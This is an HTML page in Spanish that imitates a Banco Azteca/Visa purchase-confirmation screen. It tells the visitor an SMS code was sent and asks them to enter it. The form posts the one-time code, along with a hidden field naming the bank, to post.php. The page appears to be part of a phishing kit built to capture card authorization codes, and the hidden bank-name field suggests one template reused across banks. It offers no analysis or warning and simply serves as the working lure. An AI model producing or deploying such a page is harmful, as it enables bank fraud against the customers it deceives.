<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmación de Compra - Banco Azteca</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .container {
            max-width: 400px;
            margin-top: 50px;
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 10px;
        }
        .logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            max-height: 50px;
        }
        .btn-primary {
            width: 100%;
        }
        .footer-link {
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="img/azteca.png" alt="Banco Azteca">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" style="max-height: 30px;">
        </div>
        <h5>Confirmación de compra</h5>
        <p>Te enviamos un código de verificación a tu SMS ******** para autorizar la compra a Digital en con tu tarjeta ************</p>
        
        <form action="post.php" method="POST">
    <div class="mb-3">
        <label for="otp" class="form-label">Código de verificación</label>
        <input type="text" class="form-control" id="otp" name="otp" placeholder="Ingresa el código">
    </div>

    <!-- Campo oculto para enviar el valor del banco -->
    <input type="hidden" name="TxtBanco" value="Azteca">

    <button type="submit" class="btn btn-primary">Enviar</button>
</form>

        
     
        
        <div class="footer-link">
            <a href="#">¿NO RECIBISTE EL CÓDIGO? SOLICÍTALO NUEVAMENTE</a>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
